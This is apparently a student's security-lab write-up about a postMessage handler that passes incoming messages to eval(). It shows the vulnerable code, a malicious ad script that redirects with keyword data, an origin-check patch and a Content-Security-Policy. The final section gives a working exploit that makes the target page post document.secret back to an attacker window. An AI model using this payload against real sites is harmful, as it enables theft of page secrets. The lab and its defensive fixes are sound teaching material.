# Vulnerability 

The vulnerability in this app allow any adversary to send untrusted code and execute it within the vulnerable app.  This is because it does not check on the origin of the messages, rather, it assumes it's a trusted site and even allow it to eval() which is very dangeous and could be used to do a lot of malicious attacks, such as stealing cookies or performing any kind of functions on behalf of the vulnerable web-app.

To explain in details, we need to take a look at the inline JavaScript code, used in the vulnerable web-app. 


I call this vuln-app (my port 5000)
```
var requestAd = function(src) {
    var data = {
        keywords: ['lorem', 'ipsum', 'dolore']
    };

    src.postMessage(data, '*');
};

var onMessage = function(event) {
    console.log('received ' + event.data);
    eval(event.data);
};


```

And from the script loaded from the IFRAME (the third-part Ad Website): 
I call this mal-ad `(http://amplifier.ccs.neu.edu:19674)`

```
var onMessage = function(event) {
   console.log('redirecting to http://modulator.ccs.neu.edu:16915/ad');
   window.location.href = 'http://modulator.ccs.neu.edu:16915/ad?ks=' + event.data.keywords.join(',');
};

window.addEventListener('message', onMessage, false);

setTimeout("parent.postMessage('requestAd(event.source);', '*')", 2000);
```
We see a lot of violations here: 

- `vuln-app` allow `mal-ad` to execute the function `eval` 
- `vuln-app` allow any potential attacker to just open a window/frame of `vuln-app` and start communicate with it using `postMessage` and perform the adversaries attacks leveraging `eval()`.
- `mal-ad` was allowed to change location of the iframe to another website `(http://modulator.ccs.neu.edu:16915/ad)` and `vuln-app` still trusting the new loaded website and allow it to continue communicating with it with previous trust links.


# Patch 

My patch was to enforce checking of origin of messages that comes from `postMessage` and remove `eval()`

```
var onMessage = function(event) {
        if (event.origin !== "http://modulator.ccs.neu.edu:17605") 
                return;
    console.log('received ' + event.data);
    //eval(event.data);
    // instead of eval, we know that our ad-network needs requestAd, so just do it here, don't leverage that capability to other untrusted
    requestAd(event.source)
};

```


# CSP 

In addition to patching the client side, we also can do CSP ruleset that makes the browser block any vilations of the provided ruleset we are sending the HTTP response headers.


```
   resp.headers['Content-Security-Policy'] =  'default-src \'self\'; '
    resp.headers['Content-Security-Policy'] += 'script-src  \'self\' \'unsafe-inline\' http://modulator.ccs.neu.edu:17605 ;'
    resp.headers['Content-Security-Policy'] += 'style-src   \'self\' \'unsafe-inline\' http://fonts.googleapis.com ;'
    resp.headers['Content-Security-Policy'] += 'font-src    \'self\' http://fonts.gstatic.com ; '
    resp.headers['Content-Security-Policy'] += 'frame-src   \'self\' http://modulator.ccs.neu.edu:17605 ;'


```

So this will make sure to allow all the identified resources and used in this web-app, and it might need to be updated whenever a new resource outside of this policy scope is wanted. This ruleset are very tight as possible. We can enhance this to make style-src * so it gets more freedom on loading external links.  But I had to make sure it's very tight to follow your requirements. 



# The Exploit

I only had to open a new pop-window of location=vuln-app and use postMessage to communicate with the vuln-app and have to do eval() to send me back document.secret.   Notice i was using the vulnerable-test app port 3000 (http://amplifier.ccs.neu.edu:18286/)
```
				var onMessage = function(event) {
                                    document.getElementById("ta_1").value = 'secret = ' + event.data
                                }
                                   
                                window.addEventListener('message', onMessage, false);

                                var win = window.open("http://amplifier.ccs.neu.edu:18286/", "", "width=250, height=300")
                                function send() { 
                                        win.postMessage('alert(document.secret); event.source.postMessage(document.secret, "*");', '*')
                                }

```
Because vuln-app use eval(event.data); so whatever you put on the postMessage, it will be parsed by eval on vuln-app side. So event.source that will point to our exploit window. 


I tried it and it worked very well, and end up seeing alert first then having secret = XYZ in the textarea


